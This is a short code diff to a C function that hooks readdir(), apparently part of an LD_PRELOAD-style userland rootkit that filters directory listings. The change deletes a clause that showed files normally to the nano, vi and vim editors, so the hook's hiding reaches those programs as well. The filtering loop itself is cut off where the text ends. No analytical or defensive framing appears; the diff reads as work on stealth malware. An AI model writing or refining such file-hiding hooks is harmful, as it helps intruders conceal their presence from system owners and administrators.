@@ -34,15 +34,6 @@ struct dirent *readdir(DIR *dirp) {
 
     if (inside_hook) return orig(dirp);
 
-  if (program_invocation_short_name && (
-        strcmp(program_invocation_short_name, "nano") == 0 ||
-        strcmp(program_invocation_short_name, "vi") == 0 ||
-        strcmp(program_invocation_short_name, "vim") == 0)) {
-        
-        return orig(dirp); // Show the file normally
-    }
-
-
     inside_hook = 1;
     struct dirent *e;
     while ((e = orig(dirp))) {
